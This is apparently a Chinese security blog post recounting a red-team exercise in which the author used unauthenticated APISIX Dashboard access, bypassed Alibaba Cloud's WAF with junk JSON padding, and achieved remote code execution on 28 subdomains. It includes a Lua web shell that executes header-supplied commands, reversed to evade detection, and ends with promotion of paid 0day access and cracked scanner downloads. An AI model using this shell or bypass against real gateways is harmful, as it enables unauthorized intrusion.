#  某互联网厂商 Apisix绕阿里WAF拿下Rce-漏洞挖掘   
漏洞挖掘  渗透安全HackTwo   2024-02-04 00:00  
  
0x01 前言   
         
  
   
在前不久的一次地级市攻防演练中  
，给定的资产少之又少，很难找到突破点，但是经过一轮的信息收集发现某个地址使用了  
apisix网关，RCE漏洞不就来了吗?但是绕WAF的过程还是比较困难的。  
  
**末尾可领取字典等资源文件**  
  
0x02 漏洞发现        如图使用了apisix网关的WebServer在用户访问不存在的路由时，会抛出如下错误，这可以作为我们指纹识别的特征所在。{  "error_msg": "404 Route Not Found"}        针对Apisix节点的攻击方法，想要RCE的话，历史上主要有“默认X-API-Key”和“Dashboard未授权访问”两个洞可以用过往挖某SRC的时候，就遇到过默认X-API-Key导致可直接创建执行lua代码的恶意路由的问题。        恰巧这次攻防演练中，某目标子域的Apisix节点，默认key改了，但是存在Dashboard的未授权访问。        直接去Github扒了一个脚本，发现能检测出漏洞，但是RCE利用不成功，把reponse打印出来后，果然...被阿里云的WAF给拦了。0x03绕阿里WAF        把创建恶意路由的请求包中，添加一个带有大量脏数据的Json键，发现阿里云不拦了。        用之前的Dashboard未授权访问漏洞查看路由，显示恶意路由确实是被写入了...但是直接访问恶意路由却依然提示404。        通过未授权访问漏洞，获取全量路由配置后，发现目标apisix应该是集群部署的.../apisix/admin/migrate/export        每个路由需要有一个host键来确定该路由被添加到哪个子域。        随后再次构造写入恶意路由的数据，把host键加上，发现可以成功写入了。        利用未授权接口读出全量路由config，并提取出host键，确定可写入恶意路由的子域范围。import jsondef read_config():    with open("data.json", 'r') as json_file:        config = json.load(json_file)    return configdata = read_config()if "Routes" in data:    for route in data["Routes"]:        if "host" in route:            host_value = route["host"]            with open("data.txt", "a") as file:                file.write(host_value + "\n")                print(host_value)        但是后面执行命令，有的时候会被阿里云给拦掉，于是构造lua脚本时把传参和命令输出做了倒转，防止被流量检测到。local file=io.popen(string.reverse(ngx.req.get_headers()['Authenication']),'r')local output=file:read('*all')file:close()ngx.say(string.reverse(output))        由于该apisix集群部署管理了28个子域的服务，所以成功拿下28个子域Rce。  
0x04 内部福利介绍！  
          
星球内部VIP资源包含但不限于网上未公开的day漏洞（漏洞POC更新到500+）2024最新企业SRC/CNVD/Edu/众测实战挖掘技巧报告，红队内网横向渗透，代码审计，JS逆向，SRC培训等课程。圈子对新人友好，加入圈子拥有FOFA shadan 360Quake等等高级会员账号，SRC文档，武器库。**目前圈子资****源10w+，如果你想享受外界未公开的0day 1day漏洞或者学习如何挖SRC赚零花钱欢迎加入我们的圈子**  
。**(详情点击下方地址了解-->>最后5张优惠券，后台回复 "星球" 获取优惠券，名额有限，即将调整价格！)**  
  
[点击了解-->>内部VIP知识星球福利介绍V1.2版本](http://mp.weixin.qq.com/s?__biz=Mzg3ODE2MjkxMQ==&mid=2247485301&idx=1&sn=8b899ed5026fce84317f234a55a16412&chksm=cf16a1c5f86128d31be0ab0d402c0fb83dfef8a4f7f855f32e6237cd1eb4eab9fb53308963be&scene=21#wechat_redirect)  
  
  
****  
结尾  
  
# 免责声明  
  
  
# 获取方法  
  
  
回复“**app**  
" 获取  app渗透和app抓包教程  
  
回复“**渗透字典**" 获取 针对一些字典重新划分处理（需要更多完整字典可加入星球获取）  
  
回复“**书籍**" 获取 网络安全相关经典书籍电子版pdf  
  
********  
  
# 最后必看  
  
  
      
文章中的案例或工具仅面向合法授权的企业安全建设行为，如您需要测试内容的可用性，请自行搭建靶机环境，勿用于非法行为。如  
用于其他用途，由使用者承担全部法律及连带责任，与作者和本公众号无关。  
本项目所有收录的poc均为漏洞的理论判断，不存在漏洞利用过程，不会对目标发起真实攻击和漏洞利用。文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用。  
如您在使用本工具或阅读文章的过程中存在任何非法行为，您需自行承担相应后果，我们将不承担任何法律及连带责任。本工具或文章或来源于网络，若有侵权请联系作者删除，请在24小时内删除，请勿用于商业行为，自行查验是否具有后门，切勿相信软件内的广告！  
  
  
  
  
  
# 往期推荐  
  
  
**1. 内部VIP知识星球福利介绍V1.2版本-元旦优惠**  
  
**2. 最新BurpSuite2023.12.1专业版中英文版下载**  
  
[3. 最新Nessus2023下载Windows/Linux](http://mp.weixin.qq.com/s?__biz=Mzg3ODE2MjkxMQ==&mid=2247484713&idx=1&sn=0fdab59445d9e0849843077365607b18&chksm=cf16a399f8612a8f6feb8362b1d946ea15ce4ff8a4a4cf0ce2c21f433185c622136b3c5725f3&scene=21#wechat_redirect)  
  
  
[4. 最新xray1.9.11高级版下载Windows/Linux](http://mp.weixin.qq.com/s?__biz=Mzg3ODE2MjkxMQ==&mid=2247483882&idx=1&sn=e1bf597eb73ee7881ae132cc99ac0c8e&chksm=cf16a75af8612e4c73eda9f52218ccfc6de72725eb37aff59e181435de095b71e653b446c521&scene=21#wechat_redirect)  
  
  
[5. 最新HCL AppScan Standard 10.2.128273破解版下载](http://mp.weixin.qq.com/s?__biz=Mzg3ODE2MjkxMQ==&mid=2247483850&idx=1&sn=8fad4ed1e05443dce28f6ee6d89ab920&chksm=cf16a77af8612e6c688c55f7a899fe123b0f71735eb15988321d0bd4d14363690c96537bc1fb&scene=21#wechat_redirect)  
  
  
  
###### 渗透安全HackTwo  
  
  
微信号：关注公众号获取  
  
后台回复星球加入：  
知识星球  
  
扫码关注 了解更多  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RjOvISzUFq6qFFAxdkV2tgPPqL76yNTw38UJ9vr5QJQE48ff1I4Gichw7adAcHQx8ePBPmwvouAhs4ArJFVdKkw/640?wx_fmt=png "二维码")  
  
  
  
喜欢的朋友可以点赞转发支持一下  
  
  
